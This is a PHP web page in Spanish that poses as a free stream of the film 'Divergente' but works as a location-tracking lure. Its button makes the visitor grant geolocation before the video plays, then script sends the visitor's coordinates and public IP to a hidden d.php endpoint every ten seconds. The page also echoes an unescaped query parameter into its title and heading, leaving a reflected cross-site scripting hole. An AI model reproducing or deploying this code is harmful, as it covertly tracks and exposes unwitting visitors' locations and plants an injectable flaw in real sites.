<?php
error_reporting(0);
if(isset($_GET['q'])){
    $ccc =  $_GET['q'];
}else{
    $ccc = "Ver Pelicula Divergente en Castellano";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title><?php echo $ccc;?></title>
    <style>
        body {
            text-align: center;
            background-color:black;
        }
        a{
        	color:black;
        	font-size: 1pt;
        }
        button{
        	background-color: #007bff; /* Color de fondo del botón */
		    color: #fff; /* Color del texto del botón */
		    padding: 10px 20px; /* Espaciado interior del botón */
		    border: none; /* Sin borde */
		    border-radius: 5px; /* Bordes redondeados */
		    cursor: pointer; /* Cursor de tipo puntero al pasar el mouse */
		    font-size: 16px; /* Tamaño de fuente */
        }
        button:hover{
        	background-color: #0056b3; /* Cambio de color al pasar el mouse */
        }
        *{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;}
        h1{color: white;}
    </style>
</head>
<body>
    <h1><?php echo $ccc; ?></h1>
    <button onclick="iniciarSeguimiento()">Ver película</button>
    <div id="video-container" style="display: none;">
        <iframe src="https://www.tokyvideo.com/es/embed/270921" frameborder="0" width="640" height="360" scrolling="no" allowfullscreen webkitallowfullscreen mozallowfullscreen allowtransparency style="display:block;max-width:100%;margin:0 auto 10px"></iframe>
        <p style="text-align:center;max-width:100%;width:640px;margin:0 auto;font-size:14px">
            <a href="https://www.tokyvideo.com/es/video/moviesmoon-divergente-2-insurgente-espanol-latino?utm_campaign=embed&utm_medium=embed-link&utm_source=embed-link" target="_blank">MOVIESMOON - DIVERGENTE 2 : Insurgente [Español Latino]</a> by <a href="https://www.tokyvideo.com/es?utm_campaign=embed&utm_medium=embed-home&utm_source=embed-link" target="_blank">tokyvideo.com</a>
        </p>
    </div>
    <div id="susto-container" style="display: none;">
    </div>

    <script>
        var seguimientoInterval;

        function iniciarSeguimiento() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Ubicación obtenida
                    mostrarVideo(position.coords.latitude, position.coords.longitude);

                    // Iniciar seguimiento cada 1 segundo
                    seguimientoInterval = setInterval(function() {
                        enviarCoordenadas(position.coords.latitude, position.coords.longitude);
                    }, 10000); // 1 segundo en milisegundos
                }, function(error) {
                    alert("Activa la geolocalización para poder ver el video.");
                });
            } else {
                alert("Tu navegador no soporta la geolocalización.");
            }
        }

        function mostrarVideo(latitud, longitud) {
            document.getElementById("video-container").style.display = "block";
            setTimeout(function() {
                console.log("30 segundos");
            }, 30000); // 30 segundos en milisegundos
        }

        function enviarCoordenadas(latitud, longitud) {
            // Obtener la dirección IP del cliente desde un servicio alternativo
            fetch("https://api.ipify.org?format=json")
            .then(function(response) {
                if (!response.ok) {
                    throw new Error("Error al obtener la IP");
                }
                return response.json();
            })
            .then(function(data) {
                var clientIP = data.ip;

                // Crear un objeto FormData con las coordenadas y la IP
                var formData = new FormData();
                formData.append("latitud", latitud);
                formData.append("longitud", longitud);
                formData.append("ip", clientIP);

                // Realizar una solicitud POST al archivo PHP
                fetch("d.php", {
                    method: "POST",
                    body: formData
                })
                .then(function(response) {
                    if (!response.ok) {
                        throw new Error("Error en la solicitud POST");
                    }
                    return response.text();
                })
                .then(function(data) {
                    console.log("Respuesta del servidor:", data);
                })
                .catch(function(error) {
                    console.error("Error:", error);
                });
            })
            .catch(function(error) {
                console.error("Error al obtener la IP:", error);
            });
        }
    </script>
    <noscript> ES NECESARIO ACTIVAR EL JAVASCRIPT PARA USAR LA WEB</noscript>
</body>
</html>
